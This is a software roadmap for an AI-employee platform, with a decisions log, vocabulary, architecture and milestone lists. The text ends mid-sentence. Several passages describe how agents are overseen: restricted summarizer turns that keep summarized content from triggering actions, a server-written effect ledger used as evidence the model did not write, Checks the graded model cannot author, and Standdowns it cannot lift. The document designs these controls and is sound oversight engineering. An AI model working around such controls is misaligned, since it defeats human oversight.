# Genosyn — Roadmap

> **Mission:** Run companies autonomously. Give every team a roster of AI
> employees that live by a written soul, carry real skills, work recurring
> routines on a schedule, and report back to humans.

This file is the working plan. **Edit freely** — and keep it honest. If a
feature ships, mark its milestone `[x]` here in the same PR. If reality
diverges from the plan, update the plan; don't leave it stale.

---

## Decisions log

Past calls that still shape the codebase. Listed once so future contributors
don't re-litigate them.

1. **ORM = TypeORM, sqlite → postgres via config.** Heavier than Drizzle /
   Kysely, but the cross-driver migration story is the cleanest. Entities,
   migrations, and relations work on both.
2. **Recurring AI work = "Routines".** "Tasks" is reserved for the human-style
   project/todo manager (now shipped — see `Project` + `Todo`).
3. **Home site is fully standalone.** Own package.json, own UI, no shared
   components. Open source. (Amended by M56: the site now carries a
   `/pricing` page for Genosyn Cloud plans and the self-hosted
   Community/Enterprise split — the product itself stays open source.)
4. **AI Models are employee-owned; an employee can hold several with one
   active.** Each `AIModel` keeps its credentials encrypted in `configJson`. An employee can
   register multiple models and flip exactly one to active (`AIModel.isActive`,
   newest-added wins by default). The runner and non-interactive chat seams use
   the active one; dedicated employee Chat can select any connected
   employee-owned model per message and defaults to the active one. No shared
   company pool. Firing an employee removes every model row.
5. **Database is the source of truth** for Soul, Skill, and Routine prose
   (`AIEmployee.soulBody`, `Skill.body`, `Routine.body`) and for captured Run
   logs (`Run.logContent`, 256 KB cap), model/Connection credentials, and MCP
   configuration. The filesystem under `data/` only carries repo checkouts,
   browser state, uploads, and tool artifacts.
6. **An employee is shown a working set of tools, not all of them.** The
   catalogue is reached through `find_tools` / `call_tool`; only ~20 tools ride
   on every request. Collapsing tools into `op`-dispatched families was the
   *previous* answer to the same problem and is now retired — it bought slots
   under a provider cap at the cost of schemas whose `required` decayed to
   `["op"]`. Don't add a new family; defer the granular tools instead. The
   fifteen retired family names remain callable forever as hidden aliases,
   because customer Skills name them in prose we cannot migrate.
7. **No `.env` file, ever.** Boot-critical runtime settings live in
   `App/config.ts` as one exported object with commented JSON-shape.
   Operator-editable live settings (including the public URL) live in the
   database and are managed from Admin.
8. **The sales pipeline is a flat list of Deal Stages, not a `Pipeline`.**
   `Pipeline` already means the DAG automation primitive (M10). Deal stages are
   company-scoped and ordered, with no container entity — a company has one
   sales process until it very much does not, and a second one is a nullable
   `processId` whenever somebody actually asks. "Pipeline coverage" survives as
   a metric name only.
9. **`Customer` stays the account; `Contact` is the person.** M32 did not
   introduce a pre-revenue Account object. A Customer is simply not billable
   until it has an invoice, which means Contracts, Statements, ACV and the whole
   invoice chain work for prospects for free. `Contact.customerId` and
   `Deal.customerId` are both nullable so the relationship can start with
   neither.
10. **Subscription auth is an OpenAI-only, self-hosted exception.** Direct
    API-key and custom-endpoint models still run through Genosyn's in-process
    loop. An OpenAI model may use `authMode: "subscription"` through the
    official pinned `@openai/codex` app-server, authenticated by ChatGPT device
    sign-in or a Business / Enterprise Codex access token. The credential stays
    encrypted on `AIModel.configJson`. Managed sessions are materialized only
    in a locked temporary `CODEX_HOME`; access tokens enter only the child
    process environment. `config.security.multiTenant` rejects this mode, as
    does coding-tools `host` mode because it permits same-UID child processes.
    Working `bubblewrap` — the shipped default, and what the standard Docker
    image runs — supports subscription sign-in and Runs alongside isolated
    `bash` and repository work. It only works if the container was created able
    to start it: Docker's stock profile denies both the namespace `clone` and
    the private `/proc` mount, so the CLI passes `seccomp=unconfined` and
    `systempaths=unconfined`, and `genosyn upgrade` recreates a container that
    predates them. Where the sandbox cannot start, boot falls back to the safe
    `disabled` mode, which supports the same sign-in and Runs
    without coding tools, repository materialization, or user-configured stdio
    MCP. This mode
    supports one App replica. Anthropic subscription credentials remain
    unsupported because Anthropic prohibits third-party products from routing
    traffic against subscription limits.
11. **An employee asking a human is a different primitive from the system
    gating an employee.** `Decision` was not folded into `Approval.kind`, even
    though both end in a human pressing a button. An Approval exists because
    the server is holding a specific action it will replay on ✓ — binary,
    admin-gated, payload-redacted, and never the employee's idea. A Decision
    exists because the employee decided to stop: it authors the question and
    the options, answering fires no side effect, and a Member can answer it.
    Sharing a table would have meant sharing an authorization model, and the
    only way to share it is to take the stricter one — which would put
    everyday questions behind an admin with a second factor, and leave the
    feature unused. Anything privileged the employee does with its answer
    still meets its own Approval, so nothing is weakened by the split.
12. **Home shows only what it has.** Every panel there is a queue, and an empty
    queue is not news. Cards that rendered "Nothing is waiting on a human
    decision" or "No unread channels or DMs" cost a grid slot each to say
    nothing, and six of them pushed the one thing that *did* need a human below
    the fold — the exact failure the page exists to prevent. So each panel, and
    each counter in the strip above them, hides itself when it is empty; the
    decision stack and the failure alert always worked this way and the rest now
    match. A day with nothing outstanding gets one `AllClear` message instead of
    a wall of reassurance. If you are about to add a card to Home, give it the
    same guard.
13. **A TLDR is a summary, never a new authority boundary.** A company-wide
    TLDR may read public Workspace messages, company-visible journal entries,
    and terminal Routine Run output, but never private channels, DMs, or direct
    employee chat. The chosen AI
    Employee runs through the restricted model seam with only the structured
    submission tool and no action-capable tools, so content being summarized
    cannot turn the recap into an action. A question card answers on that same
    restricted seam whether a Member asked it or a standing question produced
    it, so neither asking nor configuring is a route around it; working out
    which buttons an answer deserves is a second restricted turn whose only
    tool is likewise a submission sink. Only a follow-up a Member deliberately
    sends — or a button they press after reading the sentence printed on it —
    carries tools, and it carries that Member's own access rather than the
    employee's. A button never widens what its presser could already do, and
    nothing hidden rides along with one: what is authorized is exactly what was
    shown. Reading is personal:
    one Member dismissing a TLDR hides it only for them and never deletes the
    company's preserved history or hides it from somebody else. Question cards
    are not personal — like the briefing, they belong to the company.
14. **Editions are resolved by one seam, and licenses validate offline.**
    (M56.) A single entitlements resolver decides what an install and a
    company may use: when instance billing is enabled (Genosyn Cloud), the
    company's Plan decides — Free / Growth / Scale, billed through Stripe per
    AI Employee hired; when billing is disabled (self-hosted), the instance
    license decides — a valid Enterprise license unlocks SSO and the Audit
    log, and Community keeps everything else unlimited and free. Feature
    gates never fork the codebase: same image, same source, one 402 seam.
    Enterprise licenses are Ed25519-signed payloads verified against public
    keys embedded in the app — no phone-home, air-gap friendly — issued from
    Genosyn's own cloud install, which alone holds the signing key. Paid
    licenses degrade softly at expiry (features stay on, the UI warns, the
    pressure is commercial); evaluation licenses expire hard. Enforcement of
    the open-source boundary is honest rather than cryptographic: the gate
    code is Apache 2.0 like everything else, and what the license sells is the
    right, the updates, and the support.

15. **Evidence the model did not write, and a stop it cannot lift.** (M58.)
    Three axes now describe a Run and none of them is redundant: `status` says
    the agent loop returned, `checksVerdict` says whether the server's own
    machine-verifiable assertions passed, and `outcomeVerdict` says how a
    restricted checker graded the evidence. The middle one exists because the
    other two were both, ultimately, a model's account of a model's work — the
    checker read a transcript the graded model wrote, which recorded no tool
    results and lost its ending to truncation. The **effect ledger** is the
    other half of the fix: the audit rows a Run's own token authorized, written
    by the server after each change succeeded, are the one account the model had
    no hand in. Provenance is ambient (`withAuditContext`) rather than threaded,
    because partial coverage would make the ledger lie by omission and a Check
    reading it would pass a Run that never did the work — but it carries
    provenance only, never actor fields, since an ambient `actorEmployeeId`
    would reclassify a member-authority call from `user` to `ai`. `unverified`
    was split from `unclear` for the same reason the axes are separate: the two
    had been one word, and every consumer read the pair as "nothing was wrong",
    so a checker outage earned an employee the same credit as a graded success.
    Finally, a **Standdown** is the inverse of a Waiver and the first guardrail
    in this codebase that is not per-action and pre-authorization — and neither
    placing nor lifting one is available to an AI Employee, because a stop the
    stopped party can lift is not a stop.

---

## Vocabulary

- **Company** — a tenant. Many users belong to it.
- **Member** — a human user inside a company.
- **AI Employee** — a persistent AI persona attached to a company. Has a
  name, role, **Soul**, **Skills**, **Routines**, and (optionally) a
  `reportsToEmployeeId` for org-chart relationships.
- **Soul** — the written constitution of an employee: values, tone, how it
  makes decisions, what it refuses to do. Markdown on `AIEmployee.soulBody`.
- **Skill** — a capability the employee knows how to apply. Markdown on
  `Skill.body`.
- **Routine** — a scheduled recurring piece of work. Cron-triggered. Markdown
  brief on `Routine.body` alongside cron metadata.
- **AI Model** — a brain an AI Employee can run on: normally a direct
  connection to a model API, with a trusted single-tenant OpenAI subscription
  path through the official Codex app-server. An employee can register several
  and keep exactly one active (`AIModel.isActive`). Provider is `anthropic`
  (Claude), `openai` (GPT), or `custom` (any OpenAI-compatible endpoint); the
  API key, base URL, or OpenAI subscription credential lives encrypted on
  `AIModel.configJson`. API-key and custom models run in-process; generic
  provider CLI harnesses remain forbidden.
- **Run** — a single execution of a routine. The agent's transcript (streamed
  text + tool activity) is stored on `Run.logContent` (256 KB cap).
- **Acceptance criteria** — a Routine's plain-language definition of done
  (`Routine.acceptanceCriteria`). Folded into every Run brief; empty means no
  outcome check runs.
- **Outcome verdict** — how a completed Run measured against its Routine's
  acceptance criteria (`Run.outcomeVerdict`: `achieved` / `unclear` /
  `off_goal` / `unverified`), judged by a restricted zero-tool checker after
  the transcript is final. A separate axis from Run status, which only ever
  says the loop returned. `unclear` means the checker looked and could not
  tell; `unverified` means it never reached a judgement at all — an outage, a
  timeout, a turn that ended without answering. M58 split the two because
  every consumer downstream had been reading "we could not verify" as
  "verified".
- **Check** — a machine-verifiable assertion a Run must pass before it may
  finalize green (`RoutineCheck`), and its result on one Run
  (`RunCheckResult`). Two kinds: `command` (a shell command in the sandbox,
  passing on exit 0) and `effect` (a predicate over the Run's effect ledger).
  The graded party cannot author one — there is no MCP tool that creates,
  edits, or deletes a Check, only serializers that let an employee read the
  bar it is aimed at. `Run.checksVerdict` (`passed` / `failed` / `not_run`) is
  the third axis, beside status and the outcome verdict.
- **Effect ledger** — the `AuditEvent` rows a Run's own token authorized,
  read back in order (`services/runEffects.ts`). The server wrote them at each
  write seam after each change succeeded, which makes them the one account of
  a Run the model had no hand in producing. Rendered as **Effects** on the Run,
  fed to the outcome checker as trusted evidence, asserted over by `effect`
  Checks, and shown to a retrying Run so attempt 2 stops starting blind.
- **Standdown** — a revocable stop on all AI work at one scope (`Standdown`:
  `company` / `employee` / `routine`), placed by an admin or by the
  consecutive-failure circuit breaker, and lifted only by an admin. The exact
  inverse of an **Autonomy waiver**, and deliberately without an MCP tool in
  either direction. `Routine.enabled` remains the ordinary per-routine switch.
- **TLDR** — one company-wide, AI-written recap of public Workspace messages,
  company-visible journal entries, and terminal Routine Run output from a
  bounded period. Generated on a fixed
  cadence by a chosen AI Employee, preserved in history, and dismissed
  separately by each Member.
- **Question card** — one question answered about a TLDR (`TldrQuestion`),
  beside the briefing rather than inside it, with its own company-visible
  conversation. Either a Member asked it, or a standing question produced it.
- **Standing question** — a question the company configured once at TLDR
  settings (`TldrStandingQuestion`) that every new briefing answers
  automatically, posting each answer as its own card beneath the brief.
- **Suggested action** — a one-click next step an AI Employee attached to its
  own answer (`TldrQuestionAction`). Pressing it sends the sentence the Member
  read back to the employee as that Member's own instruction, under that
  Member's own authority.
- **Integration** — a connector type (Stripe, Gmail, GitHub, …). Static
  catalog defined in `server/integrations/providers/<name>.ts`.
- **Connection** — one authenticated account inside an Integration. DB row
  (`IntegrationConnection`), per-company.
- **Grant** — an AI employee's access to a Connection
  (`EmployeeConnectionGrant`).
- **Chat surface** — an external place a human talks to an AI Employee
  without opening Genosyn: Slack, Microsoft Teams, WhatsApp, or Telegram
  (M59). A Connection for one of those four providers *is* a chat surface;
  an adapter under `services/chatSurfaces/` translates its platform's
  envelope and one shared inbound core decides everything else.
- **Binding** — an external chat account proven to belong to a Member
  (`ExternalChatIdentity`, M59). Established only by a one-time link the
  sender opens in a browser already signed in to Genosyn — never by a
  platform-reported email — and dropped by an unbind or by losing the
  Membership, which the inbound path re-checks every turn. Without one the
  turn runs untrusted: no Soul, no Skills, no Goals, no Policies, no tools.
- **Repository** — a version-controlled workspace the company keeps
  (`Repository` + `EmployeeRepositoryGrant`): a service's source, a quarter's
  strategy, a set of policies. Either a clone of any git URL
  (provider-agnostic, HTTPS / SSH, distinct from the
  GitHub-Connection-bound repos in M12) or created empty inside Genosyn with
  no remote at all. Members work on it in the browser; granted AI employees
  work on it in isolation and their branches reach the remote only through a
  reviewed publish.
- **Work session** — a conversation with an AI Employee about one piece of work
  in a Repository, and the reviewable diff it produced
  (`RepositoryWorkSession`, one `RepositoryWorkSessionTurn` per instruction).
- **Pipeline** — DAG of typed nodes for deterministic glue (separate
  primitive from Routines). Triggered manually, by webhook, or on cron.
- **Note / Notebook** — Notion-style company-wide markdown knowledge base.
- **Base** — Airtable-style multi-table workspaces with views, comments,
  attachments.
- **Channel / DM** — Slack-style workspace chat between humans and AI.
- **Handoff** — formal AI→AI delegation with status workflow.
- **Mail Handover** — one email thread handed to one AI employee to draft,
  reply, or triage (Email section, M25). Distinct from a Handoff, which is
  AI→AI.
- **Approval** — gate that blocks an action until a human ✓.
- **Decision** — a question an AI employee stacked with the options it will
  act on. The employee raises it; a Member picks one — or, when a
  `DecisionPolicy` rule routes it, an AI decider answers under its own name
  with a human fallback on a short fuse (M53); nothing is replayed either
  way. Distinct from an Approval, which the *system* raises to block a
  specific action it will then execute (M39).
- **Waiver** — an earned, revocable exemption from one human gate
  (`AutonomyWaiver`, M53): browser approvals or one Routine's approval gate.
  Proposed by the eligibility sweep as an `autonomy_promotion` Approval,
  granted by a human, revoked automatically by any failed or off-goal Run.
- **Budget** — a monthly ad-spend envelope (`Budget`, M53): company-wide or
  scoped to a Connection or employee, enforced beside the per-Connection
  caps; the tightest applicable envelope binds.
- **Policy** — a company-wide rule binding every employee (`CompanyPolicy`,
  M53): prose injected above every Soul, plus mechanically-enforced blocked
  recipient domains and forbidden tools. A decision-routing rule is a
  `DecisionPolicy` — always said as "decision policy" so the two never blur.
- **Trigger** — an event subscription that fires a Routine when a resource
  family changes (`RoutineTrigger`, M54), riding the M31 live-sync spine
  id-only. Distinct from a Revenue **Signal**, which is a cron-evaluated
  query over a connected database.
- **Wakeup** — a timed follow-up session an employee schedules for itself
  (`EmployeeWakeup`, M54): a brief its future self reads, dispatched by the
  heartbeat.
- **Workstream** — a persistent state document for work spanning many Runs
  (`Workstream`, M54), maintained by the employee through its own tool and
  folded into every bound Routine's brief.
- **Initiative** — standing work an employee proposes with evidence
  (`Initiative`, M54); an admin accept creates the exact Routine it
  specified, owned by the proposer.
- **Goal** — a measurable objective the company steers toward (`Goal`): a
  target value with a direction, an optional deadline, an optional owning AI
  Employee, an optional parent goal, and a metric source (a manual value or
  an Explore Chart). Routines declare what objective they serve via
  `Routine.goalId` (M51).
- **Lesson** — the structured takeaway a restricted reflection turn writes
  after a failed or off-goal Run (`RunLesson`): cause plus what to do
  differently, folded into that Routine's future Run briefs (M52).
- **Revision proposal** — a staged edit to a Soul, Skill, or Routine body
  that an employee authors and only a human applies (`RevisionProposal`, on
  the `FinanceProposal` maker-checker pattern, M52). Distinct from a
  Decision (no options, a concrete diff) and an Approval (not a replayed
  action — apply writes prose).
- **Edition** — which commercial shape an install runs (M56): `community`
  (self-hosted, free), `enterprise` (self-hosted with a valid license), or
  `cloud` (instance billing enabled). Resolved per company by
  `services/entitlements.ts`; never a build flag — one image, one source.
- **Plan** — a Genosyn Cloud pricing tier a company is on (M56): Free,
  Growth, or Scale, billed through Stripe per AI Employee hired
  (`CompanyBilling.plan`). Distinct from the customer-facing Finance and
  Revenue "billing" vocabulary, which is always the company's own books.
- **Enterprise license** — a signed key unlocking enterprise features on a
  self-hosted install (M56): an Ed25519 signature over company, expiry,
  seats, and evaluation flag, verified offline against public keys embedded
  in the app. Issued at Admin → Enterprise Licenses (`EnterpriseLicense`
  registry) by the install holding the signing key; activated at Admin →
  License.

---

## Architecture

```
genosyn/
├── App/                          # Product app (open source, self-hostable)
│   ├── config.ts                 # Central JSON-shaped config + comments
│   ├── server/                   # Express + TS + TypeORM
│   │   ├── index.ts
│   │   ├── db/
│   │   │   ├── datasource.ts
│   │   │   ├── entities/         # 47+ entities — see inventory below
│   │   │   └── migrations/
│   │   ├── routes/               # 30+ HTTP routers — auth, companies, …
│   │   ├── services/             # cron, runner, chat, repoSync, oauth, …
│   │   ├── integrations/providers/  # Stripe, Gmail, GitHub, Linear, …
│   │   ├── mcp-browser/          # Isolated browser MCP child for self-hosting
│   │   ├── browser-bridge/       # Zero-dep agent a Member runs to connect their Chrome
│   │   └── middleware/           # session, auth guard, error, zod validate
│   ├── client/                   # React + Vite + Tailwind SPA
│   │   └── pages/                # 40+ pages
│   └── data/                     # runtime, gitignored
├── Helm/                         # Official Helm chart (Helm/genosyn), published
│                                 # to oci://ghcr.io/genosyn/charts on release
├── Home/                         # Marketing site, standalone
└── CLI/                          # `genosyn` cluster-maintainer bash CLI
```

### Entity inventory (by area)

- **Identity & tenancy:** `User`, `WebAuthnCredential`, `Company`,
  `Membership`, `Invitation`, `Team`
- **AI substrate:** `AIEmployee`, `AIModel`, `Skill`, `Routine`, `Run`,
  `EmployeeMemory`, `JournalEntry`, `Handoff`, `Goal` (M51), `RunLesson`,
  `RevisionProposal` (M52)
- **Conversations:** `Conversation`, `ConversationMessage`,
  `ExternalChatIdentity` (M59) — source dispatch across web, Help and the
  four chat surfaces (Slack, Microsoft Teams, WhatsApp, Telegram), an
  external thread keyed by `source` + `connectionId` + `externalKey`, action
  pills serialized into `actionsJson`
- **Workspace chat (M9):** `Channel`, `ChannelMember`, `ChannelMessage`,
  `MessageReaction`, `Attachment`
- **Explore (M20):** `Chart`, `Dashboard`, `DashboardCard`
- **Notes (M11):** `Notebook`, `Note`, `EmployeeNotebookGrant`,
  `EmployeeNoteGrant`
- **Bases (M11.5):** `Base`, `BaseTable`, `BaseField`, `BaseView`,
  `BaseRecord`, `BaseRecordComment`, `BaseRecordAttachment`,
  `EmployeeBaseGrant`
- **Tasks (Projects + Todos):** `Project`, `Todo`, `TodoComment`,
  `ProjectMember`
- **Pipelines (M10):** `Pipeline`, `PipelineRun`
- **Integrations:** `IntegrationConnection`, `EmployeeConnectionGrant`,
  `McpServer` (external MCP server registry)
- **Repositories (M21):** `Repository`, `EmployeeRepositoryGrant`,
  `RepositoryWorkSession`
- **Approvals + audit:** `Approval` (kind: routine | lightning_payment | …),
  `AuditEvent`, `Notification`
- **Editions & billing (M56):** `CompanyBilling` (per-company Plan +
  Stripe subscription state), `EnterpriseLicense` (issued-license registry
  on the signing install), `CompanySso` (per-company OIDC on Cloud)
- **TLDRs (M45):** `TldrSettings`, `Tldr`, `TldrDismissal`, `TldrQuestion`,
  `TldrQuestionMessage`, `TldrStandingQuestion`, `TldrQuestionAction`
- **Email (transactional sends):** `EmailProvider`, `EmailLog`
- **Email client (M25):** `MailAccount`, `MailThread`, `MailMessage`,
  `MailLabel`, `MailRule`, `MailHandover`, `MailChatMessage`,
  `EmployeeMailAccountGrant`
- **Backups:** `Backup`, `BackupSchedule`, `BackupDestination`
- **Environment secrets:** `Secret`
- **Password Vault (M37):** `VaultItem`, `VaultItemMemberAccess`,
  `EmployeeVaultGrant`
- **Organization:** `Tag`, `TagAssignment` (company-scoped labels attached to
  taggable resources), `RoutineFolder` (M48 — the exclusive, nestable filing
  tree for Routines; `Routine.folderId` points at it)
- **Revenue (M32):** `Contact`, `DealStage`, `Deal`, `DealContact`, `Activity`,
  `Partnership`, `PartnershipContact`, `RevenueClassification`,
  `RevenueCustomField`, `RevenueCustomValue`, `RevenueDocument`,
  `RevenueImportBatch`, `Suppression`, `Sequence`, `SequenceStep`,
  `SequenceEnrollment`, `SequenceStepRun`, `Signal`, `SignalEvent`,
  `EmployeeRevenueGrant`
- **Marketing agency (M35):** `MarketingCampaign`, `MarketingCreative`,
  `MarketingExperiment`, `MarketingPerformanceSnapshot`,
  `EmployeeMarketingGrant`
- **Signatures (M36):** `SignatureEnvelope`, `SignatureRecipient`,
  `SignatureField`, `SignatureEvent`, `EmployeeSigningGrant`

### Stack

- **Backend:** Express, TypeScript, **TypeORM** (sqlite → postgres), bcrypt,
  cookie-session, nodemailer, node-cron, zod, slugify, ws
- **Frontend:** React 18, Vite, TailwindCSS, React Router, lucide-react
- **Dev:** Vite proxies `/api/*` to Express in middleware mode (single port).
- **Runtime:** Node 22 LTS pinned in `.nvmrc`, Dockerfiles, and CI.
- **No Next.js.**

### `config.ts` shape

```ts
export const config = {
  dataDir: "./data",
  db: {
    driver: "sqlite", // "sqlite" | "postgres"
    sqlitePath: "./data/app.sqlite",
    postgresUrl: "",
  },
  port: 8471,
  sessionSecret: "change-me-in-production",
  security: {
    multiTenant: false,
    encryptionSecret: "change-me-in-production-too",
    previousEncryptionSecrets: [],
    secureCookies: "auto",
    sessionMaxAgeDays: 7,
    trustedProxyHops: 1,
    outboundPrivateHostAllowlist: [],
    bootstrapMasterAdminEmail: "",
  },
  agent: {
    codingTools: {
      executionMode: "bubblewrap",
      allowNetwork: false,
      allowUnsafeHostExecution: false,
    },
    browserEnabledInMultiTenant: false,
  },
} as const;
```

Secrets, database coordinates, and the fail-closed security posture — and
nothing else. Everything operational is a database-backed runtime setting
edited from the dashboard: the web tools, mail sync tuning, meetings, the
container's browser, and the agent's taint policy / member browsers / tool
discovery at **Admin → Runtime** (`services/runtimeSettings.ts`, one
`runtime.*` `AppSetting` row per group); the global SMTP transport at
**Admin → Email transport**; the public URL at **Admin → General**; OAuth
app credentials at **Admin → Integrations**. An install upgrading from the
old shape — including a Kubernetes ConfigMap still rendering the old
`config.js` — has those blocks imported into the database once at boot by
`importLegacyConfigOverrides()`, and they are inert afterwards.

---

## Milestones

> **Notation.** `[x]` shipped. `[~]` partial. `[ ]` not started.

### M0 — Skeleton ✅

- [x] Monorepo scaffold (`App/` + `Home/`)
- [x] `config.ts` with JSON-shape + comments
- [x] Express server, TypeORM DataSource, initial migration
- [x] React + Vite + Tailwind client, dev proxy, build pipeline
- [x] UI kit primitives (Button, Input, Card, Modal, Sidebar, …)
- [x] Home landing page
- [x] Home product pages — `/products` index plus a dedicated page per
      product surface (AI Employees, Workspace, Tasks, Bases, Notes,
      Resources, Pipelines, Explore, Email, Customers, Finance, Code),
      prerendered to static HTML at build time with per-route titles,
      descriptions, canonicals, Open Graph tags, and JSON-LD, plus
      sitemap.xml, robots.txt, and llms.txt / llms-full.txt so search
      engines and LLM crawlers index real content without executing JS
- [x] Home role pages — `/roles` index plus a dedicated page per role
      (SDR, executive assistant, marketer, support, bookkeeper, engineer,
      recruiter, analyst), each written as one working day hour by hour: the
      Routines that start themselves, the products each hour of work happens
      in, and the moment the employee stops and writes a Decision. Registered
      in the same prerender / sitemap / llms.txt pipeline as the product
      pages, and covered by `Home/tests/catalogue.test.ts`, which asserts each
      day is in chronological order, escalates at least once, and only names
      products that exist

### M1 — Auth ✅

- [x] Signup / Login / Logout (bcrypt + cookie-session)
- [x] Forgot password (token → email → reset page)
- [x] Email service: per-company `EmailProvider` rows (SMTP, SendGrid,
      Mailgun, Resend, Postmark) with global SMTP fallback and console fallback
- [x] Session middleware + `requireAuth` / `requireCompanyMember` guards
- [x] Email-verification state and a **Resend verification email** button at
      Account → Profile, on every install. `requireMasterAdmin` refuses an
      unverified account everywhere, but the full-page gate that used to own
      the only resend button is raised in shared SaaS mode alone — a
      self-hosted operator was told to verify an email with nothing to click.
      The resend reports what actually became of the mail (sent / no transport,
      so it went to the server log / rejected) rather than answering `ok`
      whatever happened

### M2 — Companies & Members ✅

- [x] Create / rename / delete company (owner-only)
- [x] Guided first-company onboarding: capture optional company mission and
      vision; hire an AI Employee from a template; connect its AI Model; and
      open a resumable, post-hire Launch plan that deterministically recommends
      Routines from the employee role, validated template, and company context.
      Existing template or matching Routines remain visible as ready; selected
      suggestions are batch-created atomically and idempotently without
      overwriting edits. Up to three enabled Integrations are ranked with
      healthy Connection and employee Grant status, before optional Gmail setup
      with a safe draft Grant and a reviewable starter chat request. The regular
      later-hire wizard reuses the same skippable Launch plan after Soul review
- [x] The guide teaches before it configures. A first "How it works" step
      defines AI Employee, Soul, Skill, Routine, Run, Connection, Grant, and AI
      Model at first use, walks the loop a scheduled Run actually follows, and
      states up front the two things members were previously left to discover:
      that they bring and pay for their own AI Model, and what an AI Employee
      can and cannot do without a human. Template cards teach Skill and Routine
      by naming the ones each template ships with
- [x] The guide finishes. A terminal summary reads the company's derived
      onboarding status back from the server — Skills written, AI Models
      connected, Routines that will actually fire and when, the mailbox access
      level actually granted — so it reports what is true rather than what the
      wizard believes it did, then hands off to chat or Home. The Launch plan's
      forward action now creates the selected Routines instead of discarding
      them, and says out loud that they start running on their own schedule
- [x] Onboarding is resumable from outside itself: Home shows a "finish setting
      up" banner while a company has no AI Employee that can answer. Progress is
      derived from real state rather than a stored flag, so it stays honest when
      setup happens outside the guide and needs no schema of its own
- [x] Every additional company created from the app-shell picker becomes active
      immediately and opens its company onboarding guide at the AI Employee step
- [x] Company switcher in app shell
- [x] Invite member by email (token link)
- [x] Roles: owner / admin / member

### M28 — Shared SaaS foundation ✅

- [x] Fail-closed shared-SaaS config profile: Postgres, HTTPS/Secure cookies,
      independent strong session/encryption secrets, global SMTP, declared
      bootstrap operator, empty private-host exceptions, and isolated AI shells
- [x] Verified-email signup and invitation binding; hashed single-use email and
      password-reset tokens; database-backed authentication throttles; 12-character
      new-password minimum; account-wide session revocation on reset/change
- [x] Enforced company roles for sensitive AI, secret, Connection, Pipeline,
      repository, email-provider, audit, and usage mutations
- [x] Optional company policy requiring TOTP/WebAuthn, including protection
      against removing the final method while the policy applies
- [x] Scoped, rotation-aware AES-256-GCM encryption for tenant/user secrets,
      with legacy ciphertext read compatibility
- [x] Public-network egress policy at URL validation and socket DNS lookup time;
      bounded redirects, timeouts, and response sizes for tenant-controlled HTTP
- [x] Bubblewrap shell isolation with a private writable employee workspace,
      cleared server environment, symlink-safe file tools, and no shell network;
      shared browser and arbitrary stdio MCP disabled in SaaS mode
- [x] Top-level AI work can overlap without a per-company application quota;
      Routine runs and chat can run together for one AI Employee, and so can
      that employee's separate chat threads — only two turns replaying the
      same transcript are serialized. Deployment operators and AI Model
      providers remain responsible for real capacity and rate limits
- [x] Requester-bound private AI Employee conversations and durable recovery;
      interactive tools enforce the intersection of live Member access and AI
      Employee Grants through an exhaustive fail-closed manifest policy, while
      unauthenticated channels receive no company-derived prompt context and
      Routine Runs retain AI-Employee-only authority
- [x] Horizontal coordination through Postgres: scheduler/worker leases, atomic
      mail claims, Telegram ownership/failover, encrypted OAuth/OIDC/WebSocket
      state, and authorized cross-replica realtime fan-out
- [x] Separate generated SQLite and Postgres migration streams, both verified
      against their real database engines
- [x] Database-backed public URL at **Admin → General**, with automatic
      first-operator detection, same-host browser request protection, and
      runtime propagation to OAuth, WebAuthn, email links, push, and OpenAPI

### M29 — Routine crash recovery & retries ✅

- [x] Every in-flight transcript is checkpointed to `Run.logContent`; each
      heartbeat reconciles Runs orphaned by a crash with an `interrupted`
      status and a marker after the last durable line, so a dead process cannot
      leave a Run looking live indefinitely
- [x] Missed occurrences recorded on the catch-up Run (`Run.missedSlots`) and
      folded into its brief; per-routine catch-up policy (`once` — the existing
      default — or `skip` for work that is only useful on time)
- [x] Per-routine bounded retries with full-jitter exponential backoff, off by
      default for failures and opt-in separately for timeouts. A future initial
      scheduled Run on an enabled, ungated Routine marked `interrupted` receives
      a durable recovery retry: exactly one after an hour at the default attempt
      limit. Higher limits let interrupted retries continue with the configured
      bounded backoff until the chain is spent. Manual, webhook, and approval
      Runs stay excluded; pausing or gating the Routine cancels dispatch, and
      existing interrupted history is never swept. Every pending retry is
      cancellable per Run
- [x] Fair, oldest-slot-first scheduler dispatch prevents restart stampedes;
      undispatched due Routines remain eligible for the next heartbeat instead
      of losing their occurrence
- [x] Cron expressions validated against the scheduler that actually runs them,
      so a routine can no longer save with a 200 and never fire

### M3 — AI Employees + Soul ✅

- [x] Create employee with template selection
      (catalog in `services/templates.ts`), including the full later-hire
      wizard and the shared M2 post-hire Launch plan
- [x] Soul scaffold seeded into `AIEmployee.soulBody`
- [x] In-app Soul editor with markdown preview
- [x] Employee list, detail pages, per-employee sidebar

### M4 — Skills ✅

- [x] Create / rename / delete skill
- [x] In-app skill body editor (markdown)
- [x] Skills attached to employees and surfaced to the runner

### M5 — Routines ✅

- [x] Create routine with cron expression
- [x] Human-readable cron preview
- [x] Markdown brief editor
- [x] Enable/disable toggle
- [x] `node-cron` registration on boot, real Run records
- [x] Live-tail run logs in a modal on manual Run
- [x] **Per-routine model.** `Routine.modelId` pins one of the employee's
      own `AIModel` rows; null (default) inherits the employee's active
      model. Runner resolves via `resolveRoutineModel()`; deleting a model
      clears the pins naming it. Pins affect Runs only; dedicated employee
      Chat has an independent per-message model picker.
- [x] **MCP surface** — `list_routines`, `create_routine`, `update_routine`
      (rename, recron, rewrite brief, enable/disable in place), and
      `delete_routine`, so an AI employee can manage routines end-to-end
      instead of only creating them.

### M23 — Routines section ✅

Routines were reachable only as a tab inside one employee. They are now a
top-level section of their own, listing every routine in the company.

- [x] Top-level **Routines** entry in the nav under a new "AI" group,
      alongside **AI Employees** (moved out of Essentials and relabelled
      from "Employees")
- [x] Company-wide `GET /routines` — every routine in the company with its
      `employee` and `lastRun` attached, sorted by employee then routine
      name. `GET /routines/:rid` is the same shape plus `body`.
- [x] Routines index: per-employee sidebar filter, health chips (All /
      Active / Paused / Needs attention), assigned-to column
- [x] Routine detail at `/routines/:empSlug/:routineSlug` — two slug
      segments because a routine slug is unique only per-employee — with
      Overview / Brief / Runs / Settings tabs
- [x] The employee Routines tab redirects to the company list filtered to
      that employee; existing `?routine=&run=` deep links preserved

### M24 — Skills section ✅

Skills were reachable only as a tab inside one employee, so the company's
playbook library was invisible. They are now a top-level section of their
own, alongside Routines — same shape, same reasoning.

- [x] Top-level **Skills** entry in the nav under the "AI" group, between
      **AI Employees** and **Routines** — who they are, what they know,
      when they work
- [x] Company-wide `GET /skills` — every skill in the company with its
      `employee` attached, sorted by employee then skill name. `body` is
